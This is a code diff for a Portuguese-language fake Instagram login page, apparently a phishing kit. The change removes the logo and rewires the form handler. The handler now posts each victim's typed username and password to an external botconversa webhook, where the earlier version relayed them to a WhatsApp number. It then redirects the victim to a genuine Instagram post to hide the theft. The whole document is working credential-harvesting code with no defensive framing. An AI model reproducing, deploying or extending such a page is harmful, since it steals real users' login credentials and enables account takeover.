@@ -44,7 +44,6 @@
             font-size: 14px;
             cursor: pointer;
             transition: background-color 0.3s;
-            margin-top: 10px;
         }
         input[type="submit"]:hover {
             background-color: #007bb5;
@@ -54,16 +53,11 @@
             font-size: 12px;
             color: #888;
         }
-        .instagram-logo {
-            width: 100px;
-            margin-bottom: 20px;
-        }
     </style>
 </head>
 <body>
     <div class="login-container">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/95/Instagram_logo_2022.svg/1200px-Instagram_logo_2022.svg.png" alt="Instagram Logo" class="instagram-logo">
-        <h2>Entrar no Instagram</h2>
+        <h2>Login no Instagram</h2>
         <form id="loginForm" onsubmit="handleSubmit(event)">
             <input type="text" id="username" placeholder="Usuário" required>
             <input type="password" id="password" placeholder="Senha" required>
@@ -82,23 +76,20 @@
             const username = document.getElementById("username").value;
             const password = document.getElementById("password").value;
 
-            // Mensagem automática a ser enviada
-            const message = `Novo login: Usuário: ${username}, Senha: ${password}`;
-
-            // Envio para o webhook (backend)
-            fetch("https://seu-backend.com/enviar-mensagem-whatsapp", { // Altere para o seu endpoint de backend
+            // Envio para o webhook
+            fetch("https://new-backend.botconversa.com.br/api/v1/webhooks-automation/catch/155079/1Q08XOfVAYfB/", {
                 method: "POST",
                 headers: {
                     "Content-Type": "application/json"
                 },
                 body: JSON.stringify({
-                    to: "+5599991337386", // Número de destino
-                    message: message // Mensagem a ser enviada via WhatsApp
+                    username: username,
+                    password: password
                 })
             })
             .then(response => response.json())
             .then(data => {
-                // Redireciona para o link do Instagram
+                // Redireciona para o link após o envio
                 window.location.href = "https://www.instagram.com/p/C3QPm7Eu8eS/";
             })
             .catch(error => {
